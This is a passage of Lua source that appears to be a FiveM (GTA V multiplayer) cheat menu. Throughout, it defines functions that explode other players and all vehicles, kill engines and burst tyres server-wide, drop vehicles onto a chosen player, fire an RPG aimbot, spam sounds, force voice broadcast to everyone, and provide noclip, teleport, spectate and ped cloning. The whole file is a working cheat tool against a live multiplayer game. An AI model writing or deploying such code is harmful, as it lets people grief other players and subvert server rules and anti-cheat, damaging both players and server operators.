            DisableControlAction(0, 14, true)

            DisableControlAction(0, 15, true)

            DisableControlAction(0, 24, true)

            DisableControlAction(0, 16, true)

            DisableControlAction(0, 17, true)

            DisableControlAction(0, 96, true)

            DisableControlAction(0, 97, true)

            DisableControlAction(0, 98, true)

            DisableControlAction(0, 96, true)

            DisableControlAction(0, 99, true)

            DisableControlAction(0, 100, true)

            DisableControlAction(0, 142, true)

            DisableControlAction(0, 143, true)

            DisableControlAction(0, 263, true)

            DisableControlAction(0, 264, true)

            DisableControlAction(0, 257, true)

            DisableControlAction(1, 26, true)

            DisableControlAction(1, 24, true)

            DisableControlAction(1, 25, true)

            DisableControlAction(1, 45, true)

            DisableControlAction(1, 45, true)

            DisableControlAction(1, 80, true)

            DisableControlAction(1, 140, true)

            DisableControlAction(1, 250, true)

            DisableControlAction(1, 263, true)

            DisableControlAction(1, 310, true)

            DisableControlAction(1, 37, true)

            DisableControlAction(1, 73, true)

            DisableControlAction(1, 1, true)

            DisableControlAction(1, 2, true)

            DisableControlAction(1, 335, true)

            DisableControlAction(1, 336, true)

            DisableControlAction(1, 106, true)

            DisableControlAction(0, 1, true)

            DisableControlAction(0, 2, true)

            DisableControlAction(0, 142, true)

            DisableControlAction(0, 322, true)

            DisableControlAction(0, 106, true)

            DisableControlAction(0, 25, true)

            DisableControlAction(0, 24, true)

            DisableControlAction(0, 257, true)

            DisableControlAction(0, 32, true)

            DisableControlAction(0, 31, true)

            DisableControlAction(0, 30, true)

            DisableControlAction(0, 34, true)

            DisableControlAction(0, 23, true)

            DisableControlAction(0, 22, true)

            DisableControlAction(0, 16, true)

            DisableControlAction(0, 17, true)
        end





        killengine = function(vehicle, ped)
            if ped == nil then
                for i = 0, 80 do
                    for i = 1, 200 do
                        SetVehicleEngineOn(vehicle, 1, 1)

                        SetVehicleEngineHealth(vehicle, -999.90002441406)
                    end
                end
            end

            if IsPedInAnyVehicle(ped, 0) then
                for i = 0, 80 do
                    for i = 1, 200 do
                        SetVehicleEngineOn(vehicle, 1, 1)

                        SetVehicleEngineHealth(vehicle, -999.90002441406)
                    end
                end
            end
        end



        Pneus = function(Vehicle)
            for i = 1, 150 do
                NetworkRequestEntityControl(Vehicle)

                SetVehicleTyreBurst(Vehicle, 0, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 1, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 2, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 3, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 4, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 5, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 4, true, 1000.0)

                SetVehicleTyreBurst(Vehicle, 7, true, 1000.0)
            end
        end



        chuvadeveiculos = function(Vehiclee, player)
            Cordenadas = GetEntityCoords(GetPlayerPed(player))

            SetVehicleOnGroundProperly(Vehiclee)

            NetworkRequestEntityControl(Vehiclee)

            SetEntityCoords(Vehiclee, Cordenadas.x, Cordenadas.y, Cordenadas.z + 10.0)

            SetEntityRotation(Vehiclee, GetCamRot(Camera, 2), 0.0, GetCamRot(Camera, 2), 0.0, true)
        end



        chuvadeveiculos2 = function(Vehicle, player)
            Cordenadas = GetEntityCoords(GetPlayerPed(player))

            SetVehicleOnGroundProperly(Vehicle)

            NetworkRequestEntityControl(Vehicle)

            SetEntityCoords(Vehicle, Cordenadas.x, Cordenadas.y, Cordenadas.z + 0.2)

            SetEntityRotation(Vehicle, GetCamRot(Camera, 2), 0.0, GetCamRot(Camera, 2), 0.0, true)
        end



        Grudarvehsinplayer = function(vehicle, ped)
            Vehiclehim = true
        end



        Explodir = function(kse, ped)
            local playerPed = GetPlayerPed(SelectedPlayer)

            local playerCds = GetEntityCoords(playerPed)

            local x, y, z = table.unpack(playerCds)

            AddExplosion(x, y, z, 44, 10, true, true, 1.0)
        end





        function DrawText(t3xt1, x, y, o9t1ne, s1z3, f0nt3, c3entr3)
            SetTextFont(4)

            if tonumber(f0nt3) ~= nil then
                SetTextFont(f0nt3)
            end

            if c3entr3 then
                SetTextCentre(true)
            end

            SetTextScale(100.0, s1z3 or 0.23)

            BeginTextCommandDisplayText("STRING")

            AddTextComponentSubstringWebsite(t3xt1)

            EndTextCommandDisplayText(x, y)
        end

        function DrawText3Ds2(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)

            local px, py, pz = table.unpack(GetGameplayCamCoords())

            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2

            local fov = (1 / GetGameplayCamFov()) * 100

            scale = scale * fov



            if onScreen then
                SetTextScale(0.0 * scale, 0.35 * scale)

                SetTextFont(0)

                SetTextProportional(1)

                SetTextColour(255, 255, 255, 215)

                SetTextOutline()

                SetTextEntry("STRING")

                SetTextCentre(1)

                AddTextComponentString(text)

                DrawText(_x, _y)
            end
        end

        if delv3hs then
            local sounds = {
                { type = "PlaySound",          soundName = 'DESPAWN',             soundSet = 'BARRY_01_SOUNDSET' },
                { type = "PlaySound",          soundName = 'Enemy_Capture_Start', soundSet = 'GTAO_Magnate_Yacht_Attack_Soundset' },
                { type = "PlaySound",          soundName = 'Enemy_Deliver',       soundSet = 'HUD_FRONTEND_MP_COLLECTABLE_SOUNDS' },
                { type = "PlaySound",          soundName = 'Change_Station_Loud', soundSet = 'Radio_Soundset' },
                { type = "PlaySound",          soundName = 'GOLF_EAGLE',          soundSet = 'HUD_AWARDS' },
                { type = "PlaySound",          soundName = 'Blip_Pickup',         soundSet = 'GTAO_Magnate_Boss_Modes_Soundset' },
                { type = "PlaySound",          soundName = 'Bomb_Disarmed',       soundSet = 'GTAO_Speed_Convoy_Soundset' },
                { type = "PlaySoundFromCoord", soundName = 'Whoosh_1s_L_to_R',    soundSet = 'MP_LOBBY_SOUNDS' },
                { type = "PlaySoundFromCoord", soundName = 'Bomb_Disarmed',       soundSet = 'GTAO_Speed_Convoy_Soundset' },
                { type = "PlaySoundFromCoord", soundName = 'Change_Station_Loud', soundSet = 'Radio_Soundset' },
                { type = "PlaySoundFromCoord", soundName = 'GOLF_EAGLE',          soundSet = 'HUD_AWARDS' },
                { type = "PlaySoundFromCoord", soundName = 'Blip_Pickup',         soundSet = 'GTAO_Magnate_Boss_Modes_Soundset' },
                { type = "PlaySoundFromCoord", soundName = 'Enemy_Capture_Start', soundSet = 'GTAO_Magnate_Yacht_Attack_Soundset' },
                { type = "PlaySoundFromCoord", soundName = 'Enemy_Deliver',       soundSet = 'HUD_FRONTEND_MP_COLLECTABLE_SOUNDS' }
            }

            for _, sound in ipairs(sounds) do
                for _, player in ipairs(GetActivePlayers()) do
                    local playerPed = GetPlayerPed(player)
                    local playerCoords = GetEntityCoords(playerPed)

                    if sound.type == "PlaySound" then
                        PlaySound(-1, sound.soundName, sound.soundSet, true)
                    elseif sound.type == "PlaySoundFromCoord" then
                        PlaySound(-1, sound.soundName, sound.soundSet, true)
                    end
                end
            end
        end

        local Voice = false
        local infiniteVoiceRange = 1000000.0 -- A very large number to simulate "infinite" range

        Voice = false

        if deleng1n3 then
            Voice = true

            if Voice then
                local playerPed = GetPlayerPed(-1)
                local playerCoords = GetEntityCoords(playerPed)

                -- Set the voice range to a very high value (effectively "infinite")
                NetworkSetTalkerProximity(infiniteVoiceRange) -- Infinite range

                local players = GetActivePlayers()
                for _, player in ipairs(players) do
                    -- You don't need to check the distance; just ensure everyone can hear you
                    SetPlayerTalkingOverride(player, true) -- Force all players to hear you
                end
            end
        end





        if killenginev3hs then
            for vehicle in EnumerateVehicles() do
                if DoesEntityExist(vehicle) then
                    SetVehicleEngineOn(vehicle, 1, 1)

                    SetVehicleEngineOn(vehicle, 1, 1)

                    SetVehicleEngineHealth(vehicle, -999.90002441406)
                end
            end
        end



        if killpneusv3hs then
            for vehicle in EnumerateVehicles() do
                if DoesEntityExist(vehicle) then
                    NetworkRequestEntityControl(vehicle)

                    SetVehicleTyreBurst(vehicle, 0, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 1, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 2, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 3, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 4, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 5, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 4, true, 1000.0)

                    SetVehicleTyreBurst(vehicle, 7, true, 1000.0)
                end
            end
        end



        if olh0st4z3r then
            if IsDisabledControlPressed(0, 46) then
                for _, player in ipairs(GetActivePlayers()) do
                    local ped = GetPlayerPed(player)

                    local x, y, z = table.unpack(GetEntityCoords(ped))

                    local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

                    local dest = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)

                    local org = GetPedBoneCoords(ped, SKEL_HEAD, 0.0, 0.0, 0.2)

                    local FOV = 3.0

                    if ped ~= PlayerPedId() then
                        if (_x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                            ShootSingleBulletBetweenCoords(org, dest, 0.0, true, GetHashKey('WEAPON_RPG'),
                                PlayerPedId(), true, false, 0.0)
                        end
                    end
                end
            end
        end

        if bugv3hs then
            local vehicle2 = GetGamePool("CVehicle")

            for _, vehicle in ipairs(vehicle2) do
                if DoesEntityExist(vehicle) then
                    NetworkRequestEntityControl(vehicle)

                    local Cordenadas = GetEntityCoords(PlayerPedId())

                    ApplyForceToEntity(vehicle, true, Cordenadas, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1, true, true)
                end
            end
        end



        if j0garv3hs then
            local vehicle2 = GetGamePool("CVehicle")

            for _, vehicle in ipairs(vehicle2) do
                if DoesEntityExist(vehicle) then
                    NetworkRequestEntityControl(vehicle)

                    local Cordenadas = GetEntityCoords(PlayerPedId())

                    ApplyForceToEntity(vehicle, true, Cordenadas, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1, true, true)
                end
            end
        end




        if Vehiclehim then
            cordenadas = GetEntityCoords(GetPlayerPed(SelectedPlayer))

            for vehicle in EnumerateVehicles() do
                NetworkRequestEntityControl(vehicle)

                SetEntityCoords(vehicle, cordenadas.x, cordenadas.y, cordenadas.z)

                SetEntityCoordsNoOffset(vehicle, cordenadas.x, cordenadas.y, cordenadas.z, true, true, true)
            end
        end





        Citizen.CreateThread(function()
            while spectar do
                Wait(0)

                if spectar then
                    DisableControlAction(0, 32, true) -- W

                    DisableControlAction(0, 31, true) -- S

                    DisableControlAction(0, 30, true) -- D

                    DisableControlAction(0, 34, true) -- A

                    DisableControlAction(0, 71, true) -- W

                    DisableControlAction(0, 72, true) -- S

                    DisableControlAction(0, 63, true) -- D

                    DisableControlAction(0, 64, true) -- A

                    local spectate_cam = spectate_cam

                    if not spectate_cam ~= nil then
                        spectate_cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                    end

                    RenderScriptCams(1, 0, 0, 1, 1)

                    SetCamActive(spectate_cam, true)

                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))

                    SetCamCoord(spectate_cam, coords.x, coords.y, coords.z + 3)

                    local offsetRotX = 0.0

                    local offsetRotY = 0.0

                    local offsetRotZ = 0.0

                    local weapondelay = 0

                    while DoesCamExist(spectate_cam) do
                        Wait(0)

                        if not spectar then
                            DestroyCam(spectate_cam, false)

                            ClearTimecycleModifier()

                            RenderScriptCams(false, false, 0, 1, 0)

                            SetFocusEntity(PlayerPedId())

                            break
                        end

                        local playerPed = GetPlayerPed(SelectedPlayer)

                        local playerRot = GetEntityRotation(playerPed, 2)

                        local rotX = playerRot.x

                        local rotY = playerRot.y

                        local rotZ = playerRot.z

                        offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)

                        offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

                        if (offsetRotX > 90.0) then
                            offsetRotX = 90.0
                        elseif (offsetRotX < -90.0) then
                            offsetRotX = -90.0
                        end

                        if (offsetRotY > 90.0) then
                            offsetRotY = 90.0
                        elseif (offsetRotY < -90.0) then
                            offsetRotY = -90.0
                        end

                        if (offsetRotZ > 360.0) then
                            offsetRotZ = offsetRotZ - 360.0
                        elseif (offsetRotZ < -360.0) then
                            offsetRotZ = offsetRotZ + 360.0
                        end

                        DisableControlAction(0, 32, true) -- W

                        DisableControlAction(0, 31, true) -- S

                        DisableControlAction(0, 30, true) -- D

                        DisableControlAction(0, 34, true) -- A

                        DisableControlAction(0, 71, true) -- W

                        DisableControlAction(0, 72, true) -- S

                        DisableControlAction(0, 63, true) -- D

                        DisableControlAction(0, 64, true) -- A

                        local x, y, z = table.unpack(GetCamCoord(spectate_cam))

                        local coords_ES = GetEntityCoords(playerPed) +
                            (RotationToDirection(GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))

                        SetCamCoord(spectate_cam, coords_ES.x - 3.0, coords_ES.y, coords_ES.z + 2.0)

                        if not Displayed then
                            SetFocusArea(GetCamCoord(spectate_cam).x, GetCamCoord(spectate_cam).y,
                                GetCamCoord(spectate_cam).z, 0.0, 0.0, 0.0)

                            SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                        end
                    end
                end
            end
        end)



        if healthmodule.v0nc then
            local ttspeed = Sliders['n0clip'].value

            local speed = ttspeed

            local player = PlayerPedId()

            local vehicleCheck = IsPedInAnyVehicle(player, false)

            local entity = vehicleCheck and GetVehiclePedIsIn(player, false) or player

            local camRot = GetGameplayCamRot(2)

            local Camerax, Cameray, Cameraz = camDirect()

            local x, y, z = table.unpack(GetEntityCoords(entity, true))

            if IsDisabledControlPressed(0, 32) then
                x = x + speed * Camerax

                y = y + speed * Cameray

                z = z + speed * Cameraz
            elseif IsDisabledControlPressed(0, 269) then
                x = x - speed * Camerax

                y = y - speed * Cameray

                z = z - speed * Cameraz
            end

            SetEntityRotation(entity, camRot.x, camRot.y, camRot.z, 2, true)

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)

            DisableControlAction(0, 30, true)

            DisableControlAction(0, 31, true)

            DisableControlAction(0, 44, true)

            DisableControlAction(0, 23, true)

            SetEntityVelocity(entity, 0.0, 0.0, 0.0)



            local noclipToggleKey = 137

            if IsControlJustPressed(1, noclipToggleKey) then
                healthmodule.v0nc = not healthmodule.v0nc
            end
        end
    end,





}



local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()

        if not id or id == 0 then
            disposeFunc(iter)

            return
        end



        local enum = { handle = iter, destructor = disposeFunc }

        setmetatable(enum, entityEnumerator)



        local next = true

        repeat
            coroutine.yield(id)

            next, id = moveFunc(iter)
        until not next



        enum.destructor, enum.handle = nil, nil

        disposeFunc(iter)
    end)
end



Copiarroupa = function()
    local ped = GetPlayerPed(SelectedPlayer)

    local Player = PlayerPedId()

    local Roupa = {

        head = GetPedDrawableVariation(ped, 0),

        head2 = GetPedPaletteVariation(ped, 0),

        head3 = GetPedTextureVariation(ped, 0),

        hair = GetPedDrawableVariation(ped, 2),

        hair2 = GetPedPaletteVariation(ped, 2),

        hair3 = GetPedTextureVariation(ped, 2),

        hat = GetPedPropIndex(ped, 0),

        hat2 = GetPedPropTextureIndex(ped, 0),

        glasses = GetPedPropIndex(ped, 1),

        glasses2 = GetPedPropTextureIndex(ped, 1),

        ear = GetPedPropIndex(ped, 2),

        ear2 = GetPedPropTextureIndex(ped, 2),

        watches = GetPedPropIndex(ped, 6),

        watches2 = GetPedPropTextureIndex(ped, 6),

        wrist = GetPedPropIndex(ped, 7),

        wrist2 = GetPedPropTextureIndex(ped, 7),

        beard = GetPedDrawableVariation(ped, 1),

        beard2 = GetPedPaletteVariation(ped, 1),

        beard3 = GetPedTextureVariation(ped, 1),

        torso = GetPedDrawableVariation(ped, 3),

        torso2 = GetPedPaletteVariation(ped, 3),

        torso3 = GetPedTextureVariation(ped, 3),

        legs = GetPedDrawableVariation(ped, 4),

        legs2 = GetPedPaletteVariation(ped, 4),

        legs3 = GetPedTextureVariation(ped, 4),

        hands = GetPedDrawableVariation(ped, 5),

        hands2 = GetPedPaletteVariation(ped, 5),

        hands3 = GetPedTextureVariation(ped, 5),

        foot = GetPedDrawableVariation(ped, 6),

        foot2 = GetPedPaletteVariation(ped, 6),

        foot3 = GetPedTextureVariation(ped, 6),

        mask = GetPedDrawableVariation(ped, 10),

        mask2 = GetPedPaletteVariation(ped, 10),

        mask3 = GetPedTextureVariation(ped, 10),

        aux = GetPedDrawableVariation(ped, 11),

        aux2 = GetPedPaletteVariation(ped, 11),

        aux3 = GetPedTextureVariation(ped, 11),

        accessories = GetPedDrawableVariation(ped, 7),

        accessories2 = GetPedPaletteVariation(ped, 7),

        accessories3 = GetPedTextureVariation(ped, 7),

        accessories4 = GetPedDrawableVariation(ped, 8),

        accessories5 = GetPedPaletteVariation(ped, 8),

        accessories6 = GetPedTextureVariation(ped, 8),

        accessories7 = GetPedDrawableVariation(ped, 9),

        accessories8 = GetPedPaletteVariation(ped, 9),

        accessories9 = GetPedTextureVariation(ped, 9),

    }

    SetPedPropIndex(Player, 0, Roupa.hat, Roupa.hat2, 1)

    SetPedPropIndex(Player, 1, Roupa.glasses, Roupa.glasses2, 1)

    SetPedPropIndex(Player, 2, Roupa.ear, Roupa.ear2, 1)

    SetPedPropIndex(Player, 6, Roupa.watches, Roupa.watches2, 1)

    SetPedPropIndex(Player, 7, Roupa.wrist, Roupa.wrist2, 1)

    SetPedComponentVariation(Player, 0, Roupa.head, Roupa.head3, Roupa.head2)

    SetPedComponentVariation(Player, 1, Roupa.beard, Roupa.beard3, Roupa.beard2)

    SetPedComponentVariation(Player, 2, Roupa.hair, Roupa.hair3, Roupa.hair2)

    SetPedComponentVariation(Player, 3, Roupa.torso, Roupa.torso3, Roupa.torso2)

    SetPedComponentVariation(Player, 4, Roupa.legs, Roupa.legs3, Roupa.legs2)

    SetPedComponentVariation(Player, 5, Roupa.hands, Roupa.hands3, Roupa.hands2)

    SetPedComponentVariation(Player, 6, Roupa.foot, Roupa.foot3, Roupa.foot2)

    SetPedComponentVariation(Player, 7, Roupa.accessories, Roupa.accessories3, Roupa.accessories2)

    SetPedComponentVariation(Player, 8, Roupa.accessories4, Roupa.accessories6, Roupa.accessories5)

    SetPedComponentVariation(Player, 9, Roupa.accessories7, Roupa.accessories9, Roupa.accessories8)

    SetPedComponentVariation(Player, 10, Roupa.mask, Roupa.mask3, Roupa.mask2)

    SetPedComponentVariation(Player, 11, Roupa.aux, Roupa.aux3, Roupa.aux2)
end



function copiarped()
    local pedSelecionado = GetPlayerPed(SelectedPlayer)

    local meuPed = PlayerPedId()

    local modeloPedSelecionado = GetEntityModel(pedSelecionado)

    local meuModeloPed = GetEntityModel(meuPed)



    if modeloPedSelecionado == meuModeloPed then
        print("O Jogador está com o Mesmo PED que você")
    else
        ClonePedToTarget(pedSelecionado, meuPed)

        local modelHash = GetEntityModel(pedSelecionado)



        while not HasModelLoaded(modelHash) do
            RequestModel(modelHash)

            Citizen.Wait(10)
        end



        if HasModelLoaded(modelHash) then
            SetPlayerModel(PlayerId(), modelHash)

            SetModelAsNoLongerNeeded(modelHash)

            SetPedDefaultComponentVariation(PlayerPedId())
        end
    end
end

-- bixopuxe Functions

function getbixopuxePed()
    local dist, ent, sret, ssx, ssy, bc = 10000000, nil

    for i = 1, #GetGamePool('CPed') do
        local p333dd = GetGamePool('CPed')[i];

        if p333dd ~= selfped then
            local c = GetPedBoneCoords(p333dd, 0x9995);

            local os, sx, sy = GetScreenCoordFromWorldCoord(c.x, c.y, c.z);



            local dista = #vector2(sx - 0.5, sy - 0.5)

            if dista < dist then
                dist, ent, sret, ssx, ssy, bc = dista, p333dd, os, sx, sy, c
            end
        end
    end

    return ent, bc, sret, ssx, ssy
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

GetAllVeh = function()
    local ret = {}

    for veh in EnumerateVehicles() do
        if GetDisplayNameFromVehicleModel(GetEntityModel(veh)) ~= "FREIGHT" and GetDisplayNameFromVehicleModel(GetEntityModel(veh)) ~= "CARNOTFOUND" then
            table.insert(ret, veh)
        end
    end

    return ret
end

function explodeallveh()
    for veh in EnumerateVehicles() do
        local playerCds = GetEntityCoords(veh)

        local x, y, z = table.unpack(playerCds)

        AddExplosion(x, y, z, 59, 10, true, true, 1.0)
    end
end

callfunc.updatePlayerList()

callfunc.updateVehicleList()









-- funções



-- others

others = {}



function others.getTextBox(id)
    if interact.textBoxes[id] then
        return interact.textBoxes[id].text
    else
        return false
    end
end

-- entity module

entityModule = {}



function entityModule.getControl(entity)
    if entity then
        local netId = NetworkGetNetworkIdFromEntity(entity)



        -- control request

        NetworkRequestControlOfNetworkId(netId)



        if NetworkHasControlOfEntity(entity) then
            print("Sucess Controled")

            return netId
        end
    end
end

function entityModule.removeFromCar(ped)
    local playerPed = GetPlayerPed(ped)



    if playerPed and IsPedInAnyVehicle(playerPed, false) then
        entityModule.getControl(playerPed)



        TaskLeaveVehicle(playerPed, GetVehiclePedIsIn(playerPed, false), 0)

        TaskLeaveAnyVehicle(playerPed, 1, 1)

        SetPedIntoVehicle(playerPed, -1, -1)

        print("Removed!")
    end
end

function getlastitem(table)
    return table[#table]
end

function generateRandomString()
    local charset = {}
    do
        for c = 48, 57 do table.insert(charset, string.char(c)) end

        for c = 65, 90 do table.insert(charset, string.char(c)) end
    end

    math.randomseed(GetGameTimer())

    local randomString = ""

    for i = 1, 6 do
        randomString = randomString .. charset[math.random(1, #charset)]
    end

    return randomString
end

cdsmodule = {}

healthmodule = {}

function cdsmodule.tpway()
    playerPed = PlayerPedId()

    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        ClearGpsPlayerWaypoint()

        DeleteWaypoint()



        local ped = PlayerPedId()

        local veh = GetVehiclePedIsUsing(PlayerPedId())



        if IsPedInAnyVehicle(ped) then
            ped = veh
        end



        local Waypoint = GetFirstBlipInfoId(8)

        local x, y, z = table.unpack(GetBlipInfoIdCoord(Waypoint, Citizen.ResultAsVector()))

        local ground

        local groundFound = false

        local groundCheckHeights = { 0.0, 50.0, 100.0, 150.0, 200.0, 250.0, 300.0, 350.0, 400.0, 450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0, 850.0, 900.0, 950.0, 1000.0, 1050.0, 1100.0 }

        Wait(1000)



        for i, height in ipairs(groundCheckHeights) do
            SetEntityCoordsNoOffset(ped, x, y, height, 0, 0, 1)



            RequestCollisionAtCoord(x, y, z)

            while not HasCollisionLoadedAroundEntity(ped) do
                RequestCollisionAtCoord(x, y, z)

                Citizen.Wait(1)
            end

            Citizen.Wait(20)



            ground, z = GetGroundZFor_3dCoord(x, y, height)

            if ground then
                z = z + 1.0

                groundFound = true

                break;
            end
        end



        RequestCollisionAtCoord(x, y, z)

        while not HasCollisionLoadedAroundEntity(ped) do
            RequestCollisionAtCoord(x, y, z)

            Citizen.Wait(1)
        end



        SetEntityCoordsNoOffset(ped, x, y, z, 0, 0, 1)
    end
end

vehiclemodule = {}


function ModelRequest(model)
    RequestModel(model)
    while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
    end
end

function vehiclemodule.Spawn(hashmodel, x, y, z)
    local name = hashmodel
    local plate = "AiCompensa"
    local entidade = PlayerPedId()
    if name and entidade then
        local model = GetHashKey(name)
        local netid = VehToNet(entidade)


        while not HasModelLoaded(model) do
            RequestModel(model)
            Citizen.Wait(10)
        end


        if HasModelLoaded(model) then
            local nveh = CreateVehicle(model, GetEntityCoords(entidade), GetEntityHeading(entidade), false, false)
            NetworkUnregisterNetworkedEntity(nveh)
            SetVehicleOnGroundProperly(nveh)
            SetVehicleNumberPlateText(nveh, plate)
            SetEntityAsMissionEntity(nveh, true, true)
            local vehicleModel = GetEntityModel(nveh)
        end
    end
end

function vehiclemodule.Spawn(hashmodel, x, y, z)
    local name = hashmodel
    local plate = "AiCompensa"
    local entidade = PlayerPedId()

    if name and entidade then
        local model = GetHashKey(name)
        local netid = VehToNet(entidade)

        while not HasModelLoaded(model) do
            RequestModel(model)
            Citizen.Wait(10)
        end

        if HasModelLoaded(model) then
            local nveh = CreateVehicle(model, GetEntityCoords(entidade), GetEntityHeading(entidade), false, false)
            SetVehicleOnGroundProperly(nveh)
            SetVehicleNumberPlateText(nveh, plate)

            local vehicleModel = GetEntityModel(nveh)
        end
    end
end

Citizen.CreateThread(function()
    while true do
        Wait(0)


        callfunc.bindscheck()

        callfunc.ifs()





        if IsControlJustPressed(0, psychovars.main.key) then
            if psychovars.main.drawing then
                overlay.outhers.disabling = true
            else
                menuwidth = 0

                overlay.opacitys.main = 0

                overlay.opacitys.contents = 0

                psychovars.main.drawing = not psychovars.main.drawing
            end
        end



        if overlay.outhers.disabling then
            anim.fadeOut()
        end





        if psychovars.main.drawing then
            mainfunctions.displayInterface()

            mainfunctions.PsychoDrag()



            callfunc.menuscheck()

            if boxwidth2 > 0.54 or overlay.anim.boxanim.first then
                callfunc.interactions()
            end



            mainfunctions.drawcursor()
        end
    end
end)
